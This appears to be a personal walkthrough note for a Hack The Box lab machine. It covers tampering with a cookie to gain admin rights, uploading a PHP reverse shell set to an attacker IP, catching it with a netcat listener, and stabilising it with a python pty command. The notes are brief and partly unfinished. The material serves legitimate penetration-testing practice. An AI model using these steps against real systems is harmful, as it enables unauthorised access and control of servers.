# TO DO
- [ ] More about Cookies
- [ ] Esc + Esc = sudo. [Link](https://youtu.be/YmZLdJRBKv0?t=2578https://youtu.be/YmZLdJRBKv0?t=2578)
- [ ] Check all


# Intro
| Dificulty | OS | Start Date | End Date | 
|---|---|---|---|
| Very Easy | Linux | 03/06/2022 | 03/06/2022 |


# Process
1. Common enumeration.
2. Use Burp Suite to find new directories.
3. Manipulate cookies to be admin and upload files.
4. Dirbust the site to find where are the uploads located.
5. Upload reverse shell 


# Burpsuite
1. Configure Firefox to send traffic trought the proxy.
2. Settings > Search "Proxy" > Settings.
3. Change to Manual proxy. Enter Loopback @IP and port 8080
4. Disable interception in Burp as it's 
5. Proxy > Intercept > Intercept in on (Disable)


# Cookies 
Found that admin was id=34322 so change the Guest id to simulate he's the admin.
![[Pasted image 20220530192240.png]]


# Reverse Shell
Located in `/usr/share/webshells/php/php-reverse-shell.php`
Change port and ip. Upload the file. Dirbust the site again to find `.php`.
```bash
$ip = '10.10.15.56';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Set up a netcat listener on the same port.
```bash
$ nc -lvnp 1234
```

In order to have a functional shell can execute this command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Search for common directories. This is a Web Server so is a good idea to check `/var/www/html/xxx/`

!!! PROBLEMES DE VPN 


# Tags
#HTB 